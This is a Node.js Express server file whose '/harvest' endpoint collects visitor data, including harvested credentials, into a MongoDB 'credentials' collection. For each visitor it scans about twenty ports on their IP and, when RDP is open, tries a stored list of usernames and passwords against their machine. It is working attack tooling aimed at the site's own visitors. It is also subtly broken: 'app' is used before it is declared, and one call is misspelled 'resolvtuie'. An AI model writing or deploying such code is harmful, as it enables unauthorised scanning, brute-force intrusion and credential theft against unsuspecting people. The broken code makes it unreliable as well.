require('dotenv').config();
const path = require('path');
const express = require('express');
const bodyParser = require('body-parser');
const { MongoClient } = require('mongodb');
const net = require('net'); // Import the net module
const rdpCredentials = require('./rdp_credentials'); // Import RDP credentials
const rdp = require('node-rdpjs'); // Import node-rdpjs

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Function to attempt RDP login
async function attemptRDPLogin(ip, username, password) {
  return new Promise((resolve) => {
    const client = rdp.createClient({
      domain: '', // No domain specified for direct IP connection
      userName: username,
      password: password,
      autoLogin: true,
      screen: { width: 1024, height: 768 }, // Dummy screen size
      logLevel: 'INFO',
    });

    let connectionTimeout = setTimeout(() => {
      client.removeAllListeners();
      resolve({ username, password, success: false, error: 'Connection timed out', timestamp: new Date().toISOString() });
      client.destroy(); // Ensure client resources are released
    }, 5000); // 5 second timeout for the RDP connection attempt

    client.on('connect', () => {
      clearTimeout(connectionTimeout);
      client.removeAllListeners();
      resolve({ username, password, success: true, timestamp: new Date().toISOString() });
      client.destroy(); // Disconnect after successful login
    });

    client.on('error', (err) => {
      clearTimeout(connectionTimeout);
      client.removeAllListeners();
      const errorMessage = err.message || err.toString();
      resolve({ username, password, success: false, error: errorMessage, timestamp: new Date().toISOString() });
      client.destroy();
    });

    client.on('close', () => {
      // This event might fire after 'connect' or 'error'.
      // If the promise has already been resolved, do nothing.
      // Otherwise, it indicates a connection failure that wasn't caught by 'error'.
    });

    client.connect(ip, 3389);
  });
}

const app = express();
const port = 3003;

const TARGET_PORTS = [21, 22, 23, 25, 80, 110, 135, 139, 443, 445, 3389, 8080, 8443, 5900, 5985, 5986, 3306, 5432, 1433, 1521, 27017];

// Function to check if a specific port is open
async function checkPort(ip, targetPort) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(1000); // 1 second timeout

    socket.on('connect', () => {
      socket.destroy();
      resolvtuie(true); // Port is open
    });

    socket.on('timeout', () => {
      socket.destroy();
      resolve(false); // Connection timed out
    });

    socket.on('error', (err) => {
      socket.destroy();
      resolve(false); // Error, port likely closed or unreachable
    });

    socket.connect(targetPort, ip);
  });
}

// Function to check multiple target ports
async function checkMultiplePorts(ip) {
  const openPorts = [];
  for (const targetPort of TARGET_PORTS) {
    const isOpen = await checkPort(ip, targetPort);
    if (isOpen) {
      openPorts.push(targetPort);
    }
  }
  return openPorts;
}

const mongoUrl = process.env.MONGODB_URI;
if (!mongoUrl) {
  console.error('MongoDB URI is not defined. Please check your .env file.');
  process.exit(1);
}
const client = new MongoClient(mongoUrl);

async function connectDb() {
  try {
    await client.connect();
    console.log('Connected to MongoDB');
  } catch (err) {
    console.error('Failed to connect to MongoDB', err);
    process.exit(1);
  }
}

app.use(bodyParser.json());
app.use(bodyParser.text({ type: '*/*' })); // Fallback for sendBeacon
app.use(express.static('.'));


app.post('/harvest', async (req, res) => {
  let data = req.body;
  console.log('Received data:', data);

  // If data is a string from sendBeacon, parse it
  if (typeof data === 'string') {
    try {
      data = JSON.parse(data);
    } catch (e) {
      console.error('Error parsing beacon data:', e);
      return res.status(400).send('Bad data format');
    }
  }
  
  // Capture client IP address
  const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  data.clientIp = clientIp;
  console.log('Client IP:', clientIp);

  // Only perform port scanning and RDP login attempts for initial scans
  if (data.type === 'initial_scan') {
    // Check for open ports
    const openPorts = await checkMultiplePorts(clientIp);
    data.openPorts = openPorts;
    console.log(`Open ports on ${clientIp}: ${openPorts.length > 0 ? openPorts.join(', ') : 'None'}`);

    // Check if RDP port (3389) is among the open ports
    const isRdpOpen = openPorts.includes(3389);
    data.rdpOpen = isRdpOpen; // Keep this for backward compatibility and specific RDP logic

    // If RDP port is open, attempt logins with provided credentials
    if (isRdpOpen) {
      console.log(`Attempting RDP logins for ${clientIp}...`);
      const loginAttempts = [];
      for (const cred of rdpCredentials) {
        const attemptResult = await attemptRDPLogin(clientIp, cred.username, cred.password);
        loginAttempts.push(attemptResult);
        console.log(`  Attempted login for ${cred.username}: ${attemptResult.success ? 'Success' : 'Failed'} (Error: ${attemptResult.error || 'None'})`);
      }
      data.rdpLoginAttempts = loginAttempts;
    }
  } else {
    // For credential harvests or other types, just log the IP
    console.log(`Received ${data.type || 'unknown type'} data from IP: ${clientIp}`);
  }
  
  console.log('Harvested data with IP, open ports, RDP status, and login attempts:', data);

  try {
    const db = client.db();
    const collection = db.collection('credentials');
    await collection.insertOne(data);
    res.status(200).send('Data saved');
  } catch (err) {
    console.error('Error saving data to MongoDB:', err);
    res.status(500).send('Error saving data');
  }
});

app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
  connectDb();
});